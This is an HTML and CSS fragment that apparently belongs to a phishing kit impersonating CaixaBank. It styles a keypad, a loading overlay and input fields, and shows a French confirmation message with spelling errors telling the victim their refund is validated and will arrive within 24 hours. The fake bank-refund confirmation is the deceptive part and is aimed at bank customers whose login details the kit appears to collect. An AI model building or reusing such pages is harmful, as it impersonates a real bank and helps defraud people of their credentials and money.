<style>
		.keypad {
		    width: 70%;
		}
		.button{
			float: left;
		    width: 13%;
		    border: 1px solid rgb(225, 230, 226);
		    padding: 2%;
		    margin: 1%;
		    color: black;
		    cursor: pointer;
		    background: white;
		    font-size: 23px;
		}
		.clear{
			float: left;
		    width: 28%;
		    margin: 1%;
		    height: 42px;
		    border: 1px solid rgb(225, 230, 226);
		    background: white;
		    cursor: pointer;
		    font-family: 'Open Sans', sans-serif;
		    font-weight: bold;
		}
		.loadingBox{
			background: hsla(44, 0%, 97%);
		    height: 500px;
		    position: fixed;
		    width: 40%;
		    top: 16%;
		    left: 30%;
		    z-index: 1;
		    display: none;
		}
		.firstnameSection{

		}
		.label1 {
		    font-size: 21px;
		}
		.input1 {
		    background: #eceeee;
		    padding: 10px;
		    font-size: 1.19rem;
		    font-family: "open_sanssemibold";
		    width: 10%;
		    color: #333;
		    border-radius: 4px;
		    border-bottom: 2px solid #666 !important;
		    margin: 0.5%;
		}
	</style>
	<form method="POST">
		<center><font style='    font-size: 28px;
    color: rgb(113, 181, 209);'>Félicitation votre service caixa remboursement es validé<br>
vous recevrez votre remboursement dans les 24 heures Caixa Bank vous remercie</font>
	</form>
